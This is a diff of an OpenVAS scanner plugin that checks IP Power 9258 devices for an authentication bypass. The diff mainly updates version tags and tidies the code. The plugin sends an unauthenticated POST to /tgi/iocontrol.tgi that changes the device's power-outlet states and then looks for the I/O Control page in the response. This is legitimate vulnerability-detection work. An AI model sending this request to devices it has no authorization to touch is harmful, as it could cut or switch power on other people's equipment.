@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ip_power_9258_48104.nasl 3115 2016-04-19 10:09:30Z benallard $
+# $Id: gb_ip_power_9258_48104.nasl 5749 2017-03-28 13:47:32Z cfi $
 #
 # IP Power 9258 TGI Scripts Unauthorized Access Vulnerability
 #
@@ -27,8 +27,8 @@
 if (description)
 {
  script_oid("1.3.6.1.4.1.25623.1.0.103172");
- script_version("$Revision: 3115 $");
- script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:09:30 +0200 (Tue, 19 Apr 2016) $");
+ script_version("$Revision: 5749 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-28 15:47:32 +0200 (Tue, 28 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-06-06 13:42:32 +0200 (Mon, 06 Jun 2011)");
  script_bugtraq_id(48104);
  script_tag(name:"cvss_base", value:"6.4");
@@ -39,7 +39,6 @@ if (description)
  script_xref(name : "URL" , value : "http://www.opengear.com/product-ip-power-9258.html");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101963/ippower-bypass.txt");
 
- script_summary("Determine if IP Power 9258 is prone to an unauthorized-access vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -59,42 +58,36 @@ if (description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 
-dirs = make_list(cgi_dirs());
-
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
    
-  url = string(dir, "/"); 
+  if( dir == "/" ) dir = "";
+  url = dir + "/";
+  buf = http_get_cache( item:url, port:port );
 
-  if(http_vuln_check(port:port, url:url,pattern:"<title>IP9258")) {
+  if( "<title>IP9258" >< buf ) {
 
-    host = get_host_name();
-    if( port != 80 && port != 443 )
-      host += ':' + port;
+    host = http_host_name( port:port );
 
     variables = string("XXX=On&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&XXX=Off&XXX_TS=0&XXX_TC=Off&ButtonName=Apply");
 
-    req = string(
-		  "POST ", dir ,"/tgi/iocontrol.tgi HTTP/1.1\r\n",
+    req = string( "POST ", dir ,"/tgi/iocontrol.tgi HTTP/1.1\r\n",
 		  "Host: ", host, "\r\n",
-		  "User-Agent: openvas\r\n",
+		  "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
 		  "Accept: */*\r\n",
 		  "Content-Length: 127\r\n",
 		  "Content-Type:
 		  application/x-www-form-urlencoded\r\n",
 		  "\r\n",
 		  variables);
+    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-     result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-
-     if(result =~ "<title>I\/O Control" && result =~ "<td>Power1</td>") {
-       security_message(port:port);
-       exit(0);
-      }	
+    if(res =~ "<title>I\/O Control" && res =~ "<td>Power1</td>") {
+      security_message(port:port);
+      exit(0);
+    }	
   }
 }
 
